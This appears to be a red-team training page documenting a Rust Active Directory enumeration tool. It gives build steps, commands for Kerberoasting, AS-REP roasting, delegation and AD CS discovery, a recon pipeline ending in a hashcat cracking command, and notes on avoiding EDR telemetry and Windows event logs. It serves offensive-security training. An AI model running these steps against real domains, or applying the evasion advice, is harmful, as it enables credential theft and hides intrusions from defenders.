---
layout: training-page
title: "ghost-ad — Rust AD Enumeration Tool — Red Team Academy"
module: "Tool Development"
tags:
  - rust
  - active-directory
  - enumeration
  - kerberoasting
  - bloodhound
  - adcs
  - opsec
  - tool-dev
  - wldap32
page_key: "tool-dev-ghost-ad"
render_with_liquid: false
---

# ghost-ad — Opsec-Focused Rust AD Enumeration

ghost-ad is a Windows AD enumeration tool written in Rust that communicates directly with `wldap32.dll` (the Windows LDAP library), bypassing the ADSI/COM stack entirely. The key distinction from tools like ADModule or ldap3: using ADSI loads `adsldp.dll`, `activeds.dll`, and the COM infrastructure — extra DLLs visible to EDR module-load telemetry. ghost-ad loads only `wldap32.dll`, using the same wire-format (RFC 4511 LDAP PDUs) with a minimal module footprint.

Authentication uses `LDAP_AUTH_NEGOTIATE` (Kerberos/NTLM via the current process token) — no new credentials stored, no logon event (Event 4624).

## Why wldap32 Direct?

| Approach | DLLs Loaded | EDR Visibility |
|----------|-------------|----------------|
| ADSI (ActiveDirectory PowerShell module, ldap3) | `adsldp.dll`, `activeds.dll`, `wldap32.dll` + COM | Higher — multiple DLLs in module list |
| **wldap32 direct** (ghost-ad) | **`wldap32.dll` only** | Minimal — same as any Windows LDAP client |
| Wireshark/packet capture | — | Identical RFC 4511 PDUs on the wire either way |

Additional opsec details:

- LDAP search Event 1644 is disabled by default on DCs
- ETW event 30 (from `wldap32.dll`) requires an **active** ETW tracing session — not enabled by default
- Authenticated Negotiate binds do NOT trigger Event 2889
- Paged search uses `ldap_search_init_page` with page size 1000 — matches RSAT tooling, below AD MaxPageSize

## Build

```
# Cross-compile for Windows from Linux:
rustup target add x86_64-pc-windows-gnu
sudo apt install gcc-mingw-w64-x86-64  # Debian/Ubuntu

cargo build --release --target x86_64-pc-windows-gnu
# Output: target/x86_64-pc-windows-gnu/release/ghostad.exe

# Native Windows build:
cargo build --release
```

`Cargo.toml` dependencies: `windows-sys` (for `wldap32` FFI bindings), `clap` (CLI), `serde` + `serde_json` (JSON output), `thiserror` (error handling).

## Usage

```
ghostad <SUBCOMMAND> [OPTIONS]

# Global flags:
#   --dc <HOST>       Target DC hostname or IP (default: auto-discover via DsGetDcNameW)
#   --json            Output JSON to stdout instead of tables
#   --output <FILE>   Write JSON to file
#   --ldaps           Connect via LDAPS (port 636) instead of plain LDAP port 389
```

## Subcommand Reference

### Domain Information

```
ghostad domain
# Shows: domain name, DCs, forest, functional level
```

### User Enumeration

```
ghostad users                           # all enabled users
ghostad users --module kerberoast       # Kerberoastable accounts (have SPNs)
ghostad users --module asrep            # AS-REP roastable (DONT_REQUIRE_PREAUTH)
ghostad users --module admins           # users with adminCount=1
ghostad users --module policy           # domain password policy
ghostad users --module stale            # enabled users inactive >90 days
ghostad users --module neverexpire      # users with non-expiring passwords
ghostad users --module locked           # currently locked accounts
```

### Group Enumeration

```
ghostad groups                          # all security groups
ghostad groups --module privileged      # Domain Admins, Enterprise Admins, etc.
```

### Computer Enumeration

```
ghostad computers                       # all computer accounts
ghostad computers --module unconstrained # unconstrained delegation hosts
ghostad computers --module constrained  # constrained delegation (S4U2Self)
ghostad computers --module rbcd         # RBCD-configured computers
```

### Attack Modules

```
ghostad kerberoast                      # request TGS for SPN accounts, output hashcat format
ghostad asrep --dc-host DC01.corp.local # AS-REP roast DONT_REQUIRE_PREAUTH accounts

ghostad acl --target "CN=Domain Admins,CN=Users,DC=corp,DC=local"  # parse DACL
ghostad shadow                          # accounts with msDS-KeyCredentialLink set
ghostad spn                             # full SPN landscape + classification
```

### BloodHound Export

```
ghostad bloodhound --output-dir ./bh-output
# Writes BloodHound CE v5 JSON: users.json, groups.json, computers.json, domains.json
# Import directly into BloodHound CE
```

### Additional Modules

```
ghostad trusts                          # all domain trusts
ghostad gpos                            # all GPOs
ghostad gpos --module links             # GPO-to-OU link enumeration
ghostad adcs                            # AD CS CA enumeration + template ESC1-3
ghostad pso                             # fine-grained password policies
ghostad all                             # run all modules
```

## Kerberoasting Internals

ghost-ad's kerberoasting uses the Windows LSA Kerberos authentication package rather than LDAP ticket requests. This is notable because it avoids calling any LDAP functions during ticket acquisition — the TGS request goes directly to the KDC over port 88, handled by LSA.

```rust
// kerberoast.rs — key technique (annotated excerpt)
//
// API path: LsaConnectUntrusted → LsaLookupAuthenticationPackage
//   → LsaCallAuthenticationPackage(KerbRetrieveEncodedTicketMessage=8)
//
// KERB_RETRIEVE_TICKET_WITH_SEC_CREDS forces a fresh TGS from the KDC
// (not served from the local ticket cache) — ensures we get a crackable ticket.
//
// No Win32 API functions called — all via direct LSA calls, which are
// less commonly hooked by EDR products than high-level credential APIs.

const KERB_RETRIEVE_ENCODED_TICKET: u32 = 8;
const KERB_RETRIEVE_TICKET_WITH_SEC_CREDS: u32 = 0x0000_0008;

// Hash format output (hashcat mode 13100):
// $krb5tgs$23$*username*realm*spn*<first16hex>$<rest_of_enc_hex>
//
// The encrypted blob is extracted by parsing the DER-encoded AP-REQ:
// [APPLICATION 1] (0x61) SEQUENCE:
//   tkt-vno [0]: 5
//   realm   [1]: GeneralString
//   sname   [2]: PrincipalName
//   enc-part [3]: EncryptedData  ← cipher field here is the crackable bytes
//     etype [0]: 23 (RC4-HMAC) or 18 (AES256)
//     cipher [2]: OCTET STRING
```

## LDAP Layer Annotated Excerpt

The core `ldap.rs` module shows the wldap32 approach:

```rust
// ldap.rs — direct wldap32.dll wrapper
//
// Rationale: ADSI also loads adsldp.dll, activeds.dll — extra DLLs
// visible to EDR module-load telemetry. Wire format is identical
// (RFC 4511 LDAP PDUs). Only wldap32.dll enters the process.
//
// Paged search: ldap_search_init_page + ldap_get_next_page_s
// Page size: 1000 — matches RSAT tooling, below AD MaxPageSize

use windows_sys::Win32::Networking::Ldap::{
    ldap_initW, ldap_bind_sW, ldap_unbind,
    ldap_search_init_pageW, ldap_get_next_page_s, ldap_search_abandon_page,
    ldap_first_entry, ldap_next_entry,
    ldap_get_dnW, ldap_first_attributeW, ldap_next_attributeW,
    ldap_get_valuesW, ldap_value_freeW,
    LDAP_AUTH_NEGOTIATE,  // Kerberos/NTLM via current process token
    LDAP_SCOPE_SUBTREE,
};

// Authentication: LDAP_AUTH_NEGOTIATE
//   Uses the current process's Kerberos/NTLM security context.
//   No credentials stored or accepted — no new logon event (4624).
//   The DC sees the same Kerberos ticket the process already has.

pub const PAGE_SIZE: u32 = 1000;
```

## OPSEC Summary

| Signal | Status |
|--------|--------|
| DLL module footprint | Minimal — `wldap32.dll` only |
| New logon event (4624) | Not generated |
| LDAP search Event 1644 | Disabled by default on DCs |
| ETW event 30 | Requires active ETW session |
| Kerberoast ticket requests | Via LSA (port 88), not LDAP |
| Page size | 1000 (matches RSAT) |

## Example: Full Recon Pipeline

```
# 1. Domain overview
ghostad domain

# 2. Find Kerberoastable accounts
ghostad users --module kerberoast --json --output kerberoast.json

# 3. Kerberoast and get hashes
ghostad kerberoast --json > krb_hashes.json

# 4. Export BloodHound data
ghostad bloodhound --output-dir ./bh/

# 5. Check for AD CS misconfigurations
ghostad adcs

# 6. Find shadow credential targets
ghostad shadow

# Crack Kerberoast hashes (on attacker):
# hashcat -m 13100 krb_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Resources

- ghost-ad source — `~/code-server/projects/ghost-ad/`
- [wldap32 documentation](https://docs.microsoft.com/en-us/windows/win32/api/winldap/) — MSDN
- [Hell's Gate indirect syscalls](https://github.com/am0nsec/HellsGate) — reference for EDR-aware API usage
- [BloodHound CE](https://github.com/SpecterOps/BloodHound) — BloodHound Community Edition
- [Certify](https://github.com/GhostPack/Certify) — AD CS attack reference
